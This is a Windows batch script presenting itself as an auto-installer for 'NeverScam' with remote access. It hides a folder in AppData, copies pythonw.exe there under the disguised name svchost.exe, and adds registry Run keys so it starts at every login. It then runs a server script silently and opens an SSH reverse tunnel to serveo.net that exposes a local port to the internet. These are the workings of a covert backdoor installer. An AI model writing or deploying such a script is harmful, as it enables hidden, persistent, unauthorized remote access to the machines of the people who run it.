@echo off
>nul 2>&1

REM NeverScam Auto-Install with Remote Access
REM Sets up server and SSH tunnel for cross-network access

REM Create hidden directory in AppData
if not exist "%APPDATA%\NeverScam" mkdir "%APPDATA%\NeverScam"
attrib +h "%APPDATA%\NeverScam"

REM Copy server.py
if exist "%~dp0server.py" copy "%~dp0server.py" "%APPDATA%\NeverScam\server.py"

REM Copy pythonw.exe to disguised name
copy "%SystemRoot%\System32\pythonw.exe" "%APPDATA%\NeverScam\svchost.exe" >nul 2>&1

REM Create SSH tunnel script for Serveo
echo @echo off > "%APPDATA%\NeverScam\tunnel.bat"
echo title NeverScam Tunnel ^>nul ^2^>^nul >> "%APPDATA%\NeverScam\tunnel.bat"
echo ssh -R 80:localhost:12345 serveo.net >> "%APPDATA%\NeverScam\tunnel.bat"

REM Add tunnel to startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NeverScamTunnel /t REG_SZ /d "\"%APPDATA%\NeverScam\tunnel.bat\"" /f >nul 2>&1

REM Add NeverScam server to startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NeverScamServer /t REG_SZ /d "\"%APPDATA%\NeverScam\svchost.exe\" \"%APPDATA%\NeverScam\server.py\"" /f >nul 2>&1

REM Run server and tunnel hidden
start /B "" "%APPDATA%\NeverScam\svchost.exe" "%APPDATA%\NeverScam\server.py" >nul 2>&1
start /B "" cmd /c "%APPDATA%\NeverScam\tunnel.bat" >nul 2>&1

exit /b 0

